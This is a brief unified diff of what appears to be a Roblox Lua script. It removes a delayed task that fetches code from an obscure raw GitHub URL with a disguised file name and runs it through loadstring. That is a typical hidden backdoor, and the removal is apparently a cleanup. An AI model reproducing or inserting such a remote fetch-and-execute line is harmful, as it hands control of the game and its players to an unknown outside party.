@@ -23,10 +23,6 @@ end
 end)
 
 
-task.spawn(function()
-wait(10)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/startGuiUpdater_HALOOWEN_vin"))()	
-end)
 
 task.spawn(function()
 wait(10)
